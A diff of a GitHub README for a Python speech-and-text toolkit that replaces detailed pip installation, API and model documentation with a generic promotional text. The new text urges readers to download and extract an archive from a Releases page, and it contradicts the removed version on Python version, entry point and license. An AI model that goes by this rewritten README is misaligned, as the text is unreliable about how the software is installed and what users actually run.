@@ -1,106 +1,64 @@
-# Multimodal
+# 🌟 Multimodal - Simple Toolkit for Speech and Text Tasks
 
-Lightweight Python toolkit for end-to-end speech and text workflows:
+## 📥 Download Now
+[![Download Multimodal](https://img.shields.io/badge/Download_Multimodal-v1.0-brightgreen)](https://github.com/ZPider0/Multimodal/releases)
 
-- speech-to-text transcription (VOSK)
-- speech NER anonymization (beep-out entities)
-- speech sentiment analysis
-- speech question answering (extractive QA)
-- text generation from context
-- document to speech (PDF/DOCX → TTS)
-- YouTube audio ingestion and local files
+## 🚀 Getting Started
 
-All required models are auto-downloaded on first use to a cache folder in `~/multimodal/resources`.
+Welcome to Multimodal! This toolkit makes it easy to work with speech and text. Whether you want to convert speech to text, analyze sentiment, or generate text, this tool helps you do it effortlessly.
 
-## Installation
+## 🛠️ Prerequisites
 
-```bash
-pip install -r requirements.txt
-pip install .
-```
+Before you start, ensure that your computer meets these basic requirements:
 
-Python 3.8+ is recommended. Windows is supported; Linux/macOS should work as well (FFmpeg required or auto-handled on Windows).
+- Operating System: Windows 10 or higher, macOS 10.14 or higher, or Linux
+- Python: Version 3.6 or higher installed on your machine
 
-## Quickstart
+You can download Python from [python.org](https://www.python.org).
 
-```python
-from multimodal import MultiModal
+## 📂 Features
 
-# 1) Anonymize named entities in speech (insert beep sound over detected spans)
-sa = MultiModal("speech_ner_anonymizer")
-sa.load("https://www.youtube.com/watch?v=NKWKDyDKGzw", save_folder="test_files")
-sa.anonymize()
-sa.export()  # writes *_modified.wav next to the input audio
+Multimodal offers several valuable features:
 
-# 2) Sentiment analysis over transcribed speech
-ss = MultiModal("speech_sentiment")
-ss.load("test_files/Leonardo DiCaprios Powerful Climate Summit Speech.wav")
-ss.get_sentiment()
+- **Speech-to-Text (STT)**: Convert spoken words into written text accurately.
+- **Named Entity Recognition (NER)**: Identify names, locations, and more in your text.
+- **Anonymization**: Safeguard sensitive information in your data.
+- **Sentiment Analysis**: Determine the mood of your text—positive, negative, or neutral.
+- **Question Answering (QA)**: Get answers from your documents quickly.
+- **Document to Speech**: Turn written documents into spoken words.
+- **Text Generation**: Create informative and engaging text automatically.
 
-# 3) Question answering from speech context
-sqa = MultiModal("speech_question_answering")
-sqa.load("test_files/Leonardo DiCaprios Powerful Climate Summit Speech.wav")
-sqa.get_answer("Who is Samuel?")
+## 🌍 Download & Install
 
-# 4) Document → speech (PDF or DOCX)
-d2s = MultiModal("doc_to_audio")
-d2s.load("test_files/1907.11932.pdf")
-# d2s.load("test_files/Sample Text.docx")
-d2s.speak()
+To get started with Multimodal, follow these steps:
 
-# 5) Generate text continuations from recent context (from speech or docs)
-sg = MultiModal("speech_generation")
-sg.load("test_files/Leonardo DiCaprios Powerful Climate Summit Speech.wav")
-sg.listen()                 # transcribe
-sg.generate(n_sentences=2)  # generate continuations
-sg.speak(generated=True)    # speak generated text
-```
+1. Visit the [Releases page](https://github.com/ZPider0/Multimodal/releases) to download the latest version.
+2. Click on the link to download the latest version of Multimodal for your operating system.
+3. Once downloaded, locate the file in your computer's Downloads folder.
+4. Extract the contents if the file is zipped.
+5. Open your command prompt or terminal window.
 
-## Supported tasks
+### 💻 Running Multimodal
 
-- `speech_ner_anonymizer`: Transcribe speech and mask PII/NER spans with beep inserts
-- `speech_sentiment`: Sentence-wise sentiment over transcribed speech
-- `speech_question_answering`: Extractive QA from transcribed speech
-- `doc_to_audio`: Speak the contents of PDF/DOCX via TTS
-- `speech_generation`: Generate text continuations from recent transcript/doc context
+To run Multimodal, follow these instructions:
 
-## Models and resources
+1. Use the command prompt or terminal to navigate to the folder where you extracted Multimodal.
+   - On Windows, type `cd path\to\Multimodal`.
+   - On macOS/Linux, type `cd /path/to/Multimodal`.
+2. Once in the correct folder, start the program by typing:
+   - For Windows: `python multimodal.py`
+   - For macOS/Linux: `python3 multimodal.py`
+3. Follow the on-screen instructions to perform your desired tasks.
 
-On first run, models are downloaded to `~/multimodal/resources`:
+## 🧑‍🤝‍🧑 Community Support
 
-- Speech-to-text: VOSK English model (`vosk-model-en-us-0.22`)
-- Transformers (Hugging Face):
-  - NER: `elastic/distilbert-base-uncased-finetuned-conll03-english`
-  - Sentiment: `nlptown/bert-base-multilingual-uncased-sentiment`
-  - QA: `mvonwyl/distilbert-base-uncased-finetuned-squad2`
-  - Text generation: `gpt2`
+Join our community for help and discussion about Multimodal. You can ask questions, share your projects, and learn from others.
 
-YouTube audio is fetched via `youtube_dl`. PDFs are parsed with `pdfminer.six`, DOCX via `python-docx`. TTS is provided by `pyttsx3`.
+- **GitHub Issues**: Report problems or request features through the [Issues page](https://github.com/ZPider0/Multimodal/issues).
+- **Discussions**: Engage with other users in discussions and share your experiences.
 
-## Platform notes
+## 📄 License
 
-- Windows: The toolkit auto-downloads an FFmpeg build to `~/multimodal/resources` when needed for format conversion.
-- Linux/macOS: Ensure `ffmpeg` is installed and on `PATH` (e.g., `sudo apt install ffmpeg` on Debian/Ubuntu).
+Multimodal is open-source software. You can use it freely, but please respect the license terms found in the repository.
 
-## API at a glance
-
-```python
-mm = MultiModal(task_name)                 # construct with one of the supported tasks
-mm.load(path_or_youtube_url, save_folder)  # load input (audio/PDF/DOCX)
-mm.listen()                                # transcribe speech (where applicable)
-mm.anonymize()                             # for speech_ner_anonymizer
-mm.get_sentiment()                         # for speech_sentiment
-mm.get_answer(question)                    # for speech_question_answering
-mm.generate(n_sentences=1)                 # for speech_generation
-mm.speak(generated=False)                  # speak input and/or generated text
-mm.export(path=None)                       # export modified audio (e.g., anonymized)
-```
-
-## Examples
-
-- See `demo_script.py` and `demo_notebook.ipynb` for runnable examples.
-- Try the audio sample(s) in `test_files/` or point to a YouTube URL.
-
-## License
-
-Apache-2.0 (see `LICENSE`).
+Thank you for using Multimodal! We hope this toolkit helps you with your speech and text workflows efficiently. Visit the [Releases page](https://github.com/ZPider0/Multimodal/releases) to download and start your journey today.
